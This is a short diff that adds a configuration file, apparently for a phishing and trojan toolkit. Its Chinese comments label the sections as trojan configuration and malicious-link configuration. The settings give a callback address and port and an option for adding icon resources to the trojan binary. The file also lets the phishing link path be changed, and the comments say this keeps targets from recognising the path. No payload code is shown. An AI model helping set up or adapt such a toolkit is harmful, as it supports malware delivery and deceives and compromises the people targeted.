@@ -1,0 +1,8 @@
+[appendix] # 木马配置
+ip_or_domain="127.0.0.1"
+port=3334
+is_rc=true # 是否添加图标等资源
+rc_path="resource.rc" # rc资源文件路径(相对路径以/appendix/为根路径)
+
+[links] # 恶意链接配置。如果修改了，server和client均需要重新编译
+index="/index/{id}" # 该配置可以修改钓鱼链接路径，避免钓鱼路径特征被对方记住。但请注意，{id}参数是必须的。默认为/index/{id}，发送的恶意链接格式为：http://xxxxx/index/xxid
